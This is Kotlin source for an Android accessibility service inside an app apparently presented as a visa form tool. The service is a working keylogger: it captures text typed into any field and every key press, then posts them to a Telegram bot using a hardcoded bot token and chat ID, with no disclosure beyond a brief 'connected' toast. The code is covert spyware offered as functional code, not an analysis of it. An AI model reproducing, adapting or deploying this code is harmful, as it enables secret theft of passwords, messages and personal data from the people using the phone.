package com.example.visa_form_app

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.KeyEvent
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class MyAccessibilityService : AccessibilityService() {

    private val client = OkHttpClient()
    private var lastText = ""
    private val handler = Handler(Looper.getMainLooper())
    private val debounceRunnable = Runnable { sendToTelegram(lastText) }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val rawText = event.text?.joinToString(separator = "") { it.toString() } ?: ""
            val text = rawText.ifBlank {
                event.contentDescription?.toString() ?: ""
            }
            if (text.isNotEmpty() && text != lastText) {
                lastText = text
                handler.removeCallbacks(debounceRunnable)
                handler.postDelayed(debounceRunnable, 800)
            }
        }
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event?.action == KeyEvent.ACTION_UP) {
            val keyString = KeyEvent.keyCodeToString(event.keyCode)
            val message = "KEY_EVENT: $keyString"
            sendToTelegram(message)
        }
        return false
    }

    private fun sendToTelegram(text: String) {
        val escapedText = JSONObject.quote(text)
        val json = """{"chat_id": "8416456484", "text": $escapedText}"""
        val request = Request.Builder()
            .url("https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage")
            .post(json.toRequestBody("application/json; charset=utf-8".toMediaType()))
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }

    override fun onInterrupt() {
        // This method is called when the service is interrupted
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Toast.makeText(this, "Accessibility Service Connected", Toast.LENGTH_SHORT).show()
    }
}
